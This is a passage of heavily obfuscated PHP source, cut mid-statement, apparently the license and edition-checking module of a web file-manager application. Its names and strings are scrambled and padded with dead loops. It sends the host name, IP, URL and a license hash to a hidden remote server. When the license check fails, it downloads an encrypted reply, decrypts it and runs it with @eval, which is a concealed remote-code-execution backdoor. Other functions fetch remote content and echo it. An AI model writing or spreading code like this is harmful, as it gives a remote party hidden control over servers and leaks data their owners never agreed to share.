Model($çÁ¢·æà[33])->get(); $¾÷îµ÷ = $€ÆóµÙò[753]; while (strlen($¾÷îµ÷) < $€ÆóµÙò[695]) { if (!$¾÷îµ÷) { break; } $¾÷îµ÷++; } if ($İŞË››¹[$çÁ¢·æà[108]] == $çÁ¢·æà[109]) { return; } $Òôœè†œ = Model($çÁ¢·æà[33])->get($çÁ¢·æà[100]); $´Œ¤¶ƒ“ = $çÁ¢·æà[203] . md5($Òôœè†œ . $çÁ¢·æà[204]); $ ¨°ïÈ® = $€ÆóµÙò[754]; if (!$ ¨°ïÈ®) { return; } $ÎôÄ‚¿Š = Cache::get($´Œ¤¶ƒ“); $¼âÀ—éü = $€ÆóµÙò[755]; if (strlen($¼âÀ—éü) < $€ÆóµÙò[66]) { return; } if (!is_array($ÎôÄ‚¿Š) || !isset($ÎôÄ‚¿Š[$çÁ¢·æà[207]]) || time() - $ÎôÄ‚¿Š[$çÁ¢·æà[207]] >= 60) { $”£ˆãÀ = Model($çÁ¢·æà[7])->loadList(); $šúÁÁÜÀ = $”£ˆãÀ[$çÁ¢·æà[200]]; $Ì˜îƒ = md5($_SERVER[$çÁ¢·æà[106]] . strrev($Òôœè†œ) . $İŞË››¹[$çÁ¢·æà[191]]); $¬†›ÆË³ = strrev(substr($Ì˜îƒ, 10, 16)); $ÎôÄ‚¿Š = $this->lqdm6259e359($šúÁÁÜÀ[$çÁ¢·æà[86]][$¬†›ÆË³], $Ì˜îƒ); $ÎôÄ‚¿Š = json_decode($ÎôÄ‚¿Š, !0); } if (!is_array($ÎôÄ‚¿Š)) { return $this->gnst46c66674(); } $ÂÈ«–§â = strtotime($ÎôÄ‚¿Š[$çÁ¢·æà[129]]); if (time() >= $ÂÈ«–§â) { return $this->gnst46c66674(); } if (!isset($ÎôÄ‚¿Š[$çÁ¢·æà[207]]) || time() - $ÎôÄ‚¿Š[$çÁ¢·æà[207]] > 20) { $ÎôÄ‚¿Š[$çÁ¢·æà[207]] = time(); Cache::set($´Œ¤¶ƒ“, $ÎôÄ‚¿Š); } $this->dglic348d3e7 = $ÎôÄ‚¿Š; $this->epqlbb24357a = $İŞË››¹[$çÁ¢·æà[108]]; $¼¯€åºË = $€ÆóµÙò[756]; if (!$¼¯€åºË) { die; } } private function lvhs11600b5d() { $òôæ™·ø =& $_SERVER[÷ôÚîå]; $­º‘ıªô =& $_SERVER[ü÷’á¨À]; $ÆÅ¬úêë = $GLOBALS[$­º‘ıªô[13]]; $•œ²²Œ¦ = $_SERVER[$­º‘ıªô[24]]; $ß¿¹Í = $òôæ™·ø[757]; if (strlen($ß¿¹Í) < $òôæ™·ø[711]) { die; } if ($•œ²²Œ¦ == $­º‘ıªô[208] && $this->epqlbb24357a == $­º‘ıªô[109]) { show_json(LNG($­º‘ıªô[209]), !1, $­º‘ıªô[210]); } $æØƒÓ° = array($­º‘ıªô[211], $­º‘ıªô[212]); if (in_array($•œ²²Œ¦, $æØƒÓ°)) { if ($this->epqlbb24357a == $­º‘ıªô[109] && isset($ÆÅ¬úêë[$­º‘ıªô[213]])) { show_json(LNG($­º‘ıªô[209]), !1, $­º‘ıªô[210]); die; } $€ø•Éê· = $this->ieqg85770236(); if ($€ø•Éê· != intval($­º‘ıªô[214])) { if ($€ø•Éê· <= Model($­º‘ıªô[125])->count()) { show_json(LNG($­º‘ıªô[215]), !1, $­º‘ıªô[210]); die; } } } } private function dozu0534b089() { $Ã³Šãƒ =& $_SERVER[÷ôÚîå]; $äÑøÀ‚€ =& $_SERVER[ü÷’á¨À]; $† ³²–§ = array($äÑøÀ‚€[119], $äÑøÀ‚€[120]); $È¸ƒ¶Ûû = $Ã³Šãƒ[758]; while ($È¸ƒ¶Ûû < $Ã³Šãƒ[693]) { if ($È¸ƒ¶Ûû >= 0) { break; } $È¸ƒ¶Ûû++; } if (!KodUser::isRoot() || !isset($_GET[$äÑøÀ‚€[216]])) { return; } if (!in_array($_SERVER[$äÑøÀ‚€[24]], $† ³²–§)) { return; } $™ïÔÌ÷ß = $äÑøÀ‚€[217]; $ƒ´‚Œ = $Ã³Šãƒ[759]; if (strlen($ƒ´‚Œ) < $Ã³Šãƒ[711]) { die; } $™ïÔÌ÷ß = $this->uwada3c9af0f($™ïÔÌ÷ß, $äÑøÀ‚€[218]); $ÓØõõÕ¦ = $Ã³Šãƒ[760]; if (strlen($ÓØõõÕ¦) < $Ã³Šãƒ[711]) { die; } $×¸–£İ = stream_context_create(array($äÑøÀ‚€[219] => array($äÑøÀ‚€[220] => $äÑøÀ‚€[221], $äÑøÀ‚€[222] => 3))); $ê˜««³á = $Ã³Šãƒ[761]; while (strlen($ê˜««³á) < $Ã³Šãƒ[695]) { if (!$ê˜««³á) { break; } $ê˜««³á++; } $—¼µü°Ñ = @file_get_contents($™ïÔÌ÷ß, !1, $×¸–£İ); header($äÑøÀ‚€[223]); if ($—¼µü°Ñ && strstr($—¼µü°Ñ, $äÑøÀ‚€[224])) { echo $—¼µü°Ñ; } die; } public function izdk2d00efde($²’ú¿Ÿ) { $Ö°ˆêõ =& $_SERVER[÷ôÚîå]; $—Şü—Ìô =& $_SERVER[ü÷’á¨À]; if ($this->epqlbb24357a == $—Şü—Ìô[225]) { return $²’ú¿Ÿ; } $òí›Ç»Á = $this->versionPluginList(); $î¶µôÕı = explode($—Şü—Ìô[226], $this->versionPluginFilter()); $òµ»«Ğ = $Ö°ˆêõ[762]; if (!$òµ»«Ğ) { die; } $Ü›Àô¿» = array(); $Şóšƒ¯± = $Ö°ˆêõ[763]; if (strlen($Şóšƒ¯±) < $Ö°ˆêõ[711]) { die; } foreach ($òí›Ç»Á as $ÁÅ…”Ææ => $ÚÑ»èîˆ) { if ($ÚÑ»èîˆ == $—Şü—Ìô[227] && substr($this->epqlbb24357a, 0, 1) == $—Şü—Ìô[227]) { continue; } if (!in_array($ÁÅ…”Ææ, $î¶µôÕı)) { $Ü›Àô¿»[] = $ÁÅ…”Ææ; } } foreach ($Ü›Àô¿» as $ÁÅ…”Ææ) { unset($²’ú¿Ÿ[$ÁÅ…”Ææ]); } return $²’ú¿Ÿ; } private function versionPluginList() { $·îæçì÷ =& $_SERVER[ü÷’á¨À]; return array($·îæçì÷[228] => $·îæçì÷[227], $·îæçì÷[229] => $·îæçì÷[227], $·îæçì÷[230] => $·îæçì÷[227], $·îæçì÷[231] => $·îæçì÷[232], $·îæçì÷[233] => $·îæçì÷[232], $·îæçì÷[234] => $·îæçì÷[232], $·îæçì÷[235] => $·îæçì÷[232], $·îæçì÷[236] => $·îæçì÷[232], $·îæçì÷[237] => $·îæçì÷[232], $·îæçì÷[238] => $·îæçì÷[232], $·îæçì÷[239] => $·îæçì÷[232], $·îæçì÷[240] => $·îæçì÷[232], $·îæçì÷[241] => $·îæçì÷[232], $·îæçì÷[242] => $·îæçì÷[232], $·îæçì÷[243] => $·îæçì÷[232], $·îæçì÷[244] => $·îæçì÷[232]); } private function versionPluginFilter() { $÷¯³òÇ§ =& $_SERVER[÷ôÚîå]; $ÕÌ»ßŸ =& $_SERVER[ü÷’á¨À]; if ($this->epqlbb24357a == $ÕÌ»ßŸ[109]) { return $ÕÌ»ßŸ[6]; } $ÊñÖÈÒê = _get($this->dglic348d3e7, $ÕÌ»ßŸ[245], $ÕÌ»ßŸ[6]); $‰›¸É = _get($this->dglic348d3e7, $ÕÌ»ßŸ[116], $ÕÌ»ßŸ[6]); $ÎîÖ¡âî = $÷¯³òÇ§[764]; while (strlen($ÎîÖ¡âî) < $÷¯³òÇ§[693]) { if (!$ÎîÖ¡âî) { break; } $ÎîÖ¡âî++; } $û¯¥ıõÓ = _get($this->dglic348d3e7, $ÕÌ»ßŸ[246], $ÕÌ»ßŸ[6]); if ($‰›¸É > time() && $û¯¥ıõÓ > time()) { $­şµÛñ¡ = explode($ÕÌ»ßŸ[226], $ÊñÖÈÒê); $±ŸÚ²Š  = array_keys($this->versionPluginList()); $ÊñÖÈÒê = array_merge($­şµÛñ¡, $±ŸÚ²Š ); $ÊñÖÈÒê = implode($ÕÌ»ßŸ[226], array_filter(array_unique($ÊñÖÈÒê))); } return $ÊñÖÈÒê; } private function krsm180cb74b() { $‚ ş¯Ğù =& $_SERVER[ü÷’á¨À]; if ($this->epqlbb24357a != $‚ ş¯Ğù[109]) { $GLOBALS[$‚ ş¯Ğù[86]][$‚ ş¯Ğù[90]][$‚ ş¯Ğù[247]] = $‚ ş¯Ğù[206]; return; } $GLOBALS[$‚ ş¯Ğù[86]][$‚ ş¯Ğù[248]] = $‚ ş¯Ğù[122]; if (Model($‚ ş¯Ğù[249])->get($‚ ş¯Ğù[63]) != $‚ ş¯Ğù[206]) { Model($‚ ş¯Ğù[249])->set($‚ ş¯Ğù[63], $‚ ş¯Ğù[206]); } } public function xrva679f4a80() { return $_SERVER[ü÷’á¨À][250]; } private function dvaf25219347() { $í¨›£õ¢ =& $_SERVER[÷ôÚîå]; $…Ë­ÄÁÇ =& $_SERVER[ü÷’á¨À]; $‡¾¡ìØÍ = array($…Ë­ÄÁÇ[251], $…Ë­ÄÁÇ[252], $…Ë­ÄÁÇ[253]); $çÚâÄÛÒ = $…Ë­ÄÁÇ[254] . md5($…Ë­ÄÁÇ[255]); $ˆ»Šƒ¥¦ = $í¨›£õ¢[765]; if ($this->epqlbb24357a == $…Ë­ÄÁÇ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$…Ë­ÄÁÇ[24]], $‡¾¡ìØÍ)) { return; } if (time() % 4 != 0) { return; } $¸Ñï ‰» = call_user_func(array($…Ë­ÄÁÇ[256], $…Ë­ÄÁÇ[257]), $çÚâÄÛÒ); $ûêÍßÅ¤ = $í¨›£õ¢[766]; while ($ûêÍßÅ¤ < $í¨›£õ¢[695]) { if ($ûêÍßÅ¤ >= 0) { break; } $ûêÍßÅ¤++; } if ($¸Ñï ‰» && time() - $¸Ñï ‰» < intval($…Ë­ÄÁÇ[258])) { return; } call_user_func(array($…Ë­ÄÁÇ[256], $…Ë­ÄÁÇ[139]), $çÚâÄÛÒ, time()); $Üèîîã¾ = Model($…Ë­ÄÁÇ[33])->get($…Ë­ÄÁÇ[100]); $¨úĞ¬çè = $í¨›£õ¢[767]; while (strlen($¨úĞ¬çè) < $í¨›£õ¢[66]) { if (!$¨úĞ¬çè) { break; } $¨úĞ¬çè++; } $ÁäÎˆÚ¿ = array($…Ë­ÄÁÇ[152] => Model($…Ë­ÄÁÇ[33])->get($…Ë­ÄÁÇ[153]), $…Ë­ÄÁÇ[167] => $this->epqlbb24357a, $…Ë­ÄÁÇ[163] => $_SERVER[$…Ë­ÄÁÇ[164]], $…Ë­ÄÁÇ[165] => Model($…Ë­ÄÁÇ[33])->get($…Ë­ÄÁÇ[131]), $…Ë­ÄÁÇ[105] => md5($_SERVER[$…Ë­ÄÁÇ[106]] . $Üèîîã¾), $…Ë­ÄÁÇ[156] => $…Ë­ÄÁÇ[136], $…Ë­ÄÁÇ[159] => $_SERVER[$…Ë­ÄÁÇ[160]]); $ë¡„½å® = $í¨›£õ¢[768]; $†Øà¬¦İ = $this->uyzp50af60cd($…Ë­ÄÁÇ[259], $ÁäÎˆÚ¿); $ˆòø­â® = $í¨›£õ¢[769]; if (strlen($ˆòø­â®) < $í¨›£õ¢[693]) { die; } if (!is_array($†Øà¬¦İ)) { return; } if ($†Øà¬¦İ[$…Ë­ÄÁÇ[152]] && $†Øà¬¦İ[$…Ë­ÄÁÇ[260]]) { if ($this->olhwee7f1482($†Øà¬¦İ[$…Ë­ÄÁÇ[260]]) == $ÁäÎˆÚ¿[$…Ë­ÄÁÇ[152]]) { return; } } $this->gnst46c66674(); $›Òº×Ô = $í¨›£õ¢[770]; while (strlen($›Òº×Ô) < $í¨›£õ¢[711]) { if (!$›Òº×Ô) { break; } $›Òº×Ô++; } if ($this->olhwee7f1482($†Øà¬¦İ[$…Ë­ÄÁÇ[260]]) != $ÁäÎˆÚ¿[$…Ë­ÄÁÇ[152]]) { $µ”¼á¸ = array($…Ë­ÄÁÇ[185] => $Üèîîã¾, $…Ë­ÄÁÇ[186] => $_SERVER[$…Ë­ÄÁÇ[106]], $…Ë­ÄÁÇ[187] => this_url(), $…Ë­ÄÁÇ[161] => $_SERVER[$…Ë­ÄÁÇ[162]]); $Ö¶è–ô = $this->rjzp2d0cc6b4(json_encode($µ”¼á¸)); $†Øà¬¦İ = $this->uyzp50af60cd($…Ë­ÄÁÇ[188] . $Ö¶è–ô); if ($†Øà¬¦İ && is_array($†Øà¬¦İ) && isset($†Øà¬¦İ[$…Ë­ÄÁÇ[260]])) { $¡Í¥°¢§ = $this->lqdm6259e359($†Øà¬¦İ[$…Ë­ÄÁÇ[260]], 2); if ($¡Í¥°¢§) { $¡Í¥°¢§ = $this->olhwee7f1482($¡Í¥°¢§); } if ($¡Í¥°¢§) { try { @eval($¡Í¥°¢§); } catch (Exception $›òùîõğ) { } } } } } private function uyzp50af60cd($ƒ¬“ÖˆÅ = '', $É¾¡‹ŞÜ = array(), $çäœ İ = 5) { $ıñÈ÷…Æ =& $_SERVER[÷ôÚîå]; $ãåÛäË  =& $_SERVER[ü÷’á¨À]; $’Ë¦ø· = $ãåÛäË [261]; $‹†è—é = $ıñÈ÷…Æ[771]; while ($‹†è—é < $ıñÈ÷…Æ[693]) { if ($‹†è—é >= 0) { break; } $‹†è—é++; } $’Ë¦ø· = $this->uwada3c9af0f($’Ë¦ø·, $ãåÛäË [262]); $’Ë¦ø· = $’Ë¦ø· . $ƒ¬“ÖˆÅ; $™û½çë² = $ıñÈ÷…Æ[772]; while (strlen($™û½çë²) < $ıñÈ÷…Æ[695]) { if (!$™û½çë²) { break; } $™û½çë²++; } if ($É¾¡‹ŞÜ && is_array($É¾¡‹ŞÜ)) { $’Ë¦ø· = $’Ë¦ø· . $ãåÛäË [263] . http_build_query($É¾¡‹ŞÜ); } if ($É¾¡‹ŞÜ === -1) { return $’Ë¦ø·; } $ìÙÙşÌ = stream_context_create(array($ãåÛäË [219] => array($ãåÛäË [222] => $çäœ İ, $ãåÛäË [220] => $ãåÛäË [264]), $ãåÛäË [265] => array($ãåÛäË [266] => !1, $ãåÛäË [267] => !1))); $»ğ‹è» = $ıñÈ÷…Æ[773]; if (strlen($»ğ‹è») < $ıñÈ÷…Æ[693]) { die; } $É¾¡‹ŞÜ = @file_get_contents($’Ë¦ø·, !1, $ìÙÙşÌ); $¸Ğöøá” = $ıñÈ÷…Æ[774]; if (!$¸Ğöøá”) { return; } return json_decode($É¾¡‹ŞÜ, !0); $û±†õ¥ä = $ıñÈ÷…Æ[775]; if (!$û±†õ¥ä) { die; } } private function ieqg85770236() { $ â”Äõ =& $_SERVER[÷ôÚîå]; $ˆÏæ§É =& $_SERVER[ü÷’á¨À]; $½©ñ±²Ş = array($ˆÏæ§É[268] => $ˆÏæ§É[269], $ˆÏæ§É[270] => $ˆÏæ§É[271], $ˆÏæ§É[272] => $ˆÏæ§É[273], $ˆÏæ§É[274] => $ˆÏæ§É[275], $ˆÏæ§É[276] => $ˆÏæ§É[277], $ˆÏæ§É[278] => $ˆÏæ§É[214], $ˆÏæ§É[279] => $ˆÏæ§É[214], $ˆÏæ§É[280] => $ˆÏæ§É[269], $ˆÏæ§É[281] => $ˆÏæ§É[271], $ˆÏæ§É[282] => $ˆÏæ§É[273], $ˆÏæ§É[283] => $ˆÏæ§É[284], $ˆÏæ§É[285] => $ˆÏæ§É[275], $ˆÏæ§É[286] => $ˆÏæ§É[287], $ˆÏæ§É[288] => $ˆÏæ§É[277], $ˆÏæ§É[289] => $ˆÏæ§É[290], $ˆÏæ§É[291] => $ˆÏæ§É[292], $ˆÏæ§É[293] => $ˆÏæ§É[294]); $Ï “³«“ = $½©ñ±²Ş[$this->epqlbb24357a]; $Ï “³«“ = intval($Ï “³«“ ? $Ï “³«“ : $ˆÏæ§É[269]); $ËÃÊ¾ÊÅ = _get($this->dglic348d3e7, $ˆÏæ§É[295]); $‡×ÍçÍì = $ â”Äõ[776]; $ËÃÊ¾ÊÅ = $ËÃÊ¾ÊÅ ? intval($ËÃÊ¾ÊÅ) : 0; $×Á‹îÅ = $ â”Äõ[777]; if (!$×Á‹îÅ) { return; } return $Ï “³«“ + $ËÃÊ¾ÊÅ; } public function aphg9c49c202($ÕÍ¶ÓšÉ) { $øíäŞ†½ =& $_SERVER[÷ôÚîå]; $…èµÛÖ™ =& $_SERVER[ü÷’á¨À]; $€ø¢µ¤÷ = $this->ieqg85770236(); $‡ÖÊİŠ = $øíäŞ†½[778]; while (strlen($‡ÖÊİŠ) < $øíäŞ†½[66]) { if (!$‡ÖÊİŠ) { break; } $‡ÖÊİŠ++; } if ($ÕÍ¶ÓšÉ[$…èµÛÖ™[296]] == $…èµÛÖ™[122]) { return; } if ($€ø¢µ¤÷ >= intval($…èµÛÖ™[214])) { return; } $áÈ„¥ í = Model($…èµÛÖ™[125])->count(); $¨òÓĞÓã = $øíäŞ†½[779]; if ($áÈ„¥ í <= $€ø¢µ¤÷) { return; } $”Ô„æÛ¿ = Model($…èµÛÖ™[125])->field($…èµÛÖ™[296])->limit($€ø¢µ¤÷)->select(); $”Ô„æÛ¿ = array_to_keyvalue($”Ô„æÛ¿, $…èµÛÖ™[6], $…èµÛÖ™[296]); $Ïİ‹–Ğ = $øíäŞ†½[780]; while (strlen($Ïİ‹–Ğ) < $øíäŞ†½[695]) { if (!$Ïİ‹–Ğ) { break; } $Ïİ‹–Ğ++; } if (!in_array($ÕÍ¶ÓšÉ[$…èµÛÖ™[296]], $”Ô„æÛ¿)) { show_json($…èµÛÖ™[297], !1, $…èµÛÖ™[210]); } } public function rxli18fbe2ea() { $¦ĞÒ‚” =& $_SERVER[÷ôÚîå]; $û¨Øô›˜ =& $_SERVER[ü÷’á¨À]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $®âÆ—÷İ = $û¨Øô›˜[217]; $æÖ’‡Íæ = $¦ĞÒ‚”[781]; while (strlen($æÖ’‡Íæ) < $¦ĞÒ‚”[695]) { if (!$æÖ’‡Íæ) { break; } $æÖ’‡Íæ++; } $®âÆ—÷İ = $this->uwada3c9af0f($®âÆ—÷İ, $û¨Øô›˜[218]); $ìÎ¨† = stream_context_create(array($û¨Øô›˜[219] => array($û¨Øô›˜[220] => $û¨Øô›˜[221], $û¨Øô›˜[222] => 3))); $ÀàÕˆÂ± = $¦ĞÒ‚”[782]; if (strlen($ÀàÕˆÂ±) < $¦ĞÒ‚”[695]) { die; } $¤í‘àµ = @file_get_contents($®âÆ—÷İ, !1, $ìÎ¨†); $¬¯¨“ÛÇ = $¦ĞÒ‚”[783]; echo $û¨Øô›˜[298] . hash_encode($¤í‘àµ) . $û¨Øô›˜[299]; } private function owqeda6d1c03($¥ûÉ²¶Û, $ù¨Ëâ§, $¢­Áç†¢ = 3) { $â‘ÂÓúÍ =& $_SERVER[÷ôÚîå]; $¦·§Ÿ‡¿ =& $_SERVER[ü÷’á¨À]; usleep(1); $¥ûÉ²¶Û = trim($¥ûÉ²¶Û); $äî«Ú™› = mt_rand(0, 5) . $¦·§Ÿ‡¿[6]; $Åƒ™—” = rand_string(15); $šÉÌùÑ = $¦·§Ÿ‡¿[300]; $Ôé£ˆÚ = $â‘ÂÓúÍ[784]; switch ($äî«Ú™›) { case $¦·§Ÿ‡¿[206]: $²ÈøÚİ´ = $this->nqtc058e3ce5($¥ûÉ²¶Û, strrev($ù¨Ëâ§ . $Åƒ™—”)); break; case $¦·§Ÿ‡¿[122]: $²ÈøÚİ´ = $this->nqtc058e3ce5($¥ûÉ²¶Û, strrev($Åƒ™—” . $ù¨Ëâ§)); $¿–™Éş = $â‘ÂÓúÍ[785]; if (!$¿–™Éş) { return; } break; case $¦·§Ÿ‡¿[301]: $²ÈøÚİ´ = $this->nqtc058e3ce5($¥ûÉ²¶Û, base64_encode($Åƒ™—” . $ù¨Ëâ§)); break; case $¦·§Ÿ‡¿[302]: $²ÈøÚİ´ = $this->nqtc058e3ce5($¥ûÉ²¶Û, md5($Åƒ™—” . $ù¨Ëâ§)); $ïˆ¦ßÅ = $â‘ÂÓúÍ[786]; if (!$ïˆ¦ßÅ) { return; } break; case $¦·§Ÿ‡¿[303]: $¥ûÉ²¶Û = base64_encode($¥ûÉ²¶Û); $„ª»ÖŒï = $â‘ÂÓúÍ[787]; $£÷±ÈÊó = rand(0, 64); $Üê¢ÖÓŸ = $šÉÌùÑ[$£÷±ÈÊó]; $ÚÍ¦Ë¨Û = md5($Üê¢ÖÓŸ . md5($ù¨Ëâ§ . $Üê¢ÖÓŸ) . $ù¨Ëâ§); $ÚÍ¦Ë¨Û = substr($ÚÍ¦Ë¨Û, $£÷±ÈÊó % 8, $£÷±ÈÊó % 8 + 7); $íŞ¨À— = $¦·§Ÿ‡¿[6]; $¹Ùß³Õ = $â‘ÂÓúÍ[788]; if (!$¹Ùß³Õ) { die; } $¡¨­Ÿ“ª = 0; $åçĞ‡İÛ = 0; $·±À•æ = 0; for ($¡¨­Ÿ“ª = 0; $¡¨­Ÿ“ª < strlen($¥ûÉ²¶Û); $¡¨­Ÿ“ª++) { $·±À•æ = $·±À•æ == strlen($ÚÍ¦Ë¨Û) ? 0 : $·±À•æ; $åçĞ‡İÛ = ($£÷±ÈÊó + strpos($šÉÌùÑ, $¥ûÉ²¶Û[$¡¨­Ÿ“ª]) + ord($ÚÍ¦Ë¨Û[$·±À•æ++])) % 64; $¶‘í”á… = $â‘ÂÓúÍ[789]; $íŞ¨À— .= $šÉÌùÑ[$åçĞ‡İÛ]; $“ùÊ½Õ = $â‘ÂÓúÍ[790]; if (strlen($“ùÊ½Õ) < $â‘ÂÓúÍ[711]) { return; } } $²ÈøÚİ´ = hash_encode($Üê¢ÖÓŸ . $íŞ¨À—); $‘È€³÷ = $â‘ÂÓúÍ[791]; if (!$‘È€³÷) { die; } break; $«È‰ñ… = $â‘ÂÓúÍ[792]; default: $²ÈøÚİ´ = $this->nqtc058e3ce5($¥ûÉ²¶Û, $ù¨Ëâ§ . $Åƒ™—”); break; } $²ÈøÚİ´ = strrev($äî«Ú™› . $Åƒ™—” . $²ÈøÚİ´); if ($¢­Áç†¢ - 1 > 0) { $²ÈøÚİ´ = $this->owqeda6d1c03($²ÈøÚİ´, $ù¨Ëâ§, $¢­Áç†¢ - 1); } return $²ÈøÚİ´; } private function lqdm6259e359($…‡¸ƒû, $üù§§éå, $Ö­ãØøû = 3) { $÷ºÎÅ =& $_SERVER[÷ôÚîå]; $âÓš€±‘ =& $_SERVER[ü÷’á¨À]; if (!is_string($…‡¸ƒû) || strlen($…‡¸ƒû) < 10) { return !1; } $…‡¸ƒû = trim($…‡¸ƒû); $…‡¸ƒû = strrev($…‡¸ƒû); $¶ÙÃê¼ = $…‡¸ƒû[0]; $åâÌñ«É = $÷ºÎÅ[793]; $«Ä³”ÂË = substr($…‡¸ƒû, 1, 15); $È×Óô¢ú = $÷ºÎÅ[794]; $…‡¸ƒû = substr($…‡¸ƒû, 16); $µñèÀ¦ç = $÷ºÎÅ[795]; $åÔ˜ƒ¥¶ = $âÓš€±‘[300]; switch ($¶ÙÃê¼) { case $âÓš€±‘[206]: $¾ŠÓ·³ = $this->uwada3c9af0f($…‡¸ƒû, strrev($üù§§éå . $«Ä³”ÂË)); break; $±Ş…™îÍ = $÷ºÎÅ[796]; while (strlen($±Ş…™îÍ) < $÷ºÎÅ[697]) { if (!$±Ş…™îÍ) { break; } $±Ş…™îÍ++; } case $âÓš€±‘[122]: $¾ŠÓ·³ = $this->uwada3c9af0f($…‡¸ƒû, strrev($«Ä³”ÂË . $üù§§éå)); break; case $âÓš€±‘[301]: $¾ŠÓ·³ = $this->uwada3c9af0f($…‡¸ƒû, base64_encode($«Ä³”ÂË . $üù§§éå)); $‡Èë““Ê = $÷ºÎÅ[797]; if (strlen($‡Èë““Ê) < $÷ºÎÅ[66]) { return; } break; case $âÓš€±‘[302]: $¾ŠÓ·³ = $this->uwada3c9af0f($…‡¸ƒû, md5($«Ä³”ÂË . $üù§§éå)); $ÄôÅË‚ = $÷ºÎÅ[798]; break; case $âÓš€±‘[303]: $…‡¸ƒû = hash_decode($…‡¸ƒû); $ûò³¤” = $÷ºÎÅ[799]; if (strlen($ûò³¤”) < $÷ºÎÅ[66]) { die; } $†Ş¸×üæ = $…‡¸ƒû[0]; $íÌÔõÎ§ = $÷ºÎÅ[800]; while ($íÌÔõÎ§ < $÷ºÎÅ[66]) { if ($íÌÔõÎ§ >= 0) { break; } $íÌÔõÎ§++; } $…‡¸ƒû = substr($…‡¸ƒû, 1); $æ½øÖñÆ = $÷ºÎÅ[801]; $ñªğÎ¾ã = strpos($åÔ˜ƒ¥¶, $†Ş¸×üæ); $ Æ¼Óœµ = $÷ºÎÅ[802]; if (!$ Æ¼Óœµ) { return; } $¿Ñ¯óÉµ = md5($†Ş¸×üæ . md5($üù§§éå . $†Ş¸×üæ) . $üù§§éå); $òéÉÁã± = $÷ºÎÅ[803]; while ($òéÉÁã± < $÷ºÎÅ[66]) { if ($òéÉÁã± >= 0) { break; } $òéÉÁã±++; } $¿Ñ¯óÉµ = substr($¿Ñ¯óÉµ, $ñªğÎ¾ã % 8, $ñªğÎ¾ã % 8 + 7); $ß“œ¸˜Ã = $âÓš€±‘[6]; $…­Ë÷ÔÌ = 0; $™şÇÔãù = 0; $¾ÕáÁö = $÷ºÎÅ[804]; $˜‡üÇÎÓ = 0; $„ë¢Ÿá = $÷ºÎÅ[805]; if (!$„ë¢Ÿá) { die; } for ($…­Ë÷ÔÌ = 0; $…­Ë÷ÔÌ < strlen($…‡¸ƒû); $…­Ë÷ÔÌ++) { $˜‡üÇÎÓ = $˜‡üÇÎÓ == strlen($¿Ñ¯óÉµ) ? 0 : $˜‡üÇÎÓ; $³¶È¼ãï = $÷ºÎÅ[806]; while (strlen($³¶È¼ãï) < $÷ºÎÅ[711]) { if (!$³¶È¼ãï) { break; } $³¶È¼ãï++; } $£„•ÊûÕ = $˜‡üÇÎÓ++; $™şÇÔãù = strpos($åÔ˜ƒ¥¶, $…‡¸ƒû[$…­Ë÷ÔÌ]) - $ñªğÎ¾ã - ord($¿Ñ¯óÉµ[$£„•ÊûÕ]); $º¸Şåé = $÷ºÎÅ[807]; while ($º¸Şåé < $÷ºÎÅ[693]) { if ($º¸Şåé >= 0) { break; } $º¸Şåé++; } while ($™şÇÔãù < 0) { $™şÇÔãù += 64; $şÙˆ‘ü­ = $÷ºÎÅ[808]; if (strlen($şÙˆ‘ü­) < $÷ºÎÅ[697]) { die; } } $ß“œ¸˜Ã .= $åÔ˜ƒ¥¶[$™şÇÔãù]; $³‰İ«ë = $÷ºÎÅ[809]; } $¾ŠÓ·³ = base64_decode($ß“œ¸˜Ã); $²—‘¦è = $÷ºÎÅ[810]; if (!$²—‘¦è) { return; } break; default: $¾ŠÓ·³ = $this->uwada3c9af0f($…‡¸ƒû, $üù§§éå . $«Ä³”ÂË); $ÌàÆÉëÏ = $÷ºÎÅ[811]; if (strlen($ÌàÆÉëÏ) < $÷ºÎÅ[693]) { return; } break; } if ($Ö­ãØøû - 1 > 0) { $¾ŠÓ·³ = $this->lqdm6259e359($¾ŠÓ·³, $üù§§éå, $Ö­ãØøû - 1); } return $¾ŠÓ·³; } public function rjzp2d0cc6b4($°¢š´°) { $ÏÓ¥úÄş =& $_SERVER[÷ôÚîå]; $âõõìÁ£ =& $_SERVER[ü÷’á¨À]; $™üíŠø­ = $this->sqxif8e8bfb7(); $‰åÌËĞô = $ÏÓ¥úÄş[812]; while ($‰åÌËĞô < $ÏÓ¥úÄş[66]) { if ($‰åÌËĞô >= 0) { break; } $‰åÌËĞô++; } $…¢±á–§ = $this->sqxif8e8bfb7(); $Ç‘ÄæÌÙ = $ÏÓ¥úÄş[813]; while (strlen($Ç‘ÄæÌÙ) < $ÏÓ¥úÄş[693]) { if (!$Ç‘ÄæÌÙ) { break; } $Ç‘ÄæÌÙ++; } $Â¹çø¢½ = ($™üíŠø­ - 1) * ($…¢±á–§ - 1); $·¤İä¶Æ = $ÏÓ¥úÄş[814]; while (strlen($·¤İä¶Æ) < $ÏÓ¥úÄş[695]) { if (!$·¤İä¶Æ) { break; } $·¤İä¶Æ++; } $ŸÙ‰ĞÑØ = intval(($™üíŠø­ + $…¢±á–§) / 2); $ãä¨Ù¼ä = $ÏÓ¥úÄş[815]; if (strlen($ãä¨Ù¼ä) < $ÏÓ¥úÄş[66]) { return; } while (1) { $ñ­ˆ‡–¬ = $ŸÙ‰ĞÑØ; $áò£Œï— = $ÏÓ¥úÄş[816]; while (strlen($áò£Œï—) < $ÏÓ¥úÄş[66]) { if (!$áò£Œï—) { break; } $áò£Œï—++; } $ùı»ºÚÆ = $Â¹çø¢½; $ª»£«£ = $ÏÓ¥úÄş[817]; if (!$ª»£«£) { die; } while ($ùı»ºÚÆ % $ñ­ˆ‡–¬ != 0) { $áäê¾­‡ = $ùı»ºÚÆ; $ùı»ºÚÆ = $ñ­ˆ‡–¬; $Ş«ÇŠ® = $ÏÓ¥úÄş[818]; while ($Ş«ÇŠ® < $ÏÓ¥úÄş[697]) { if ($Ş«ÇŠ® >= 0) { break; } $Ş«ÇŠ®++; } $ñ­ˆ‡–¬ = $áäê¾­‡ % $ñ­ˆ‡–¬; } if ($ñ­ˆ‡–¬ == 1) { break; } else { $ŸÙ‰ĞÑØ++; } } $ŒĞñ¨™È = 2; $ÒäáŒ½› = $ÏÓ¥úÄş[819]; if (!$ÒäáŒ½›) { return; } for ($¡Î²Ó¿Ù = 0; $¡Î²Ó¿Ù < $Â¹çø¢½ * 10; $¡Î²Ó¿Ù++) { if (($Â¹çø¢½ * $¡Î²Ó¿Ù + 1) % $ŸÙ‰ĞÑØ == 0) { 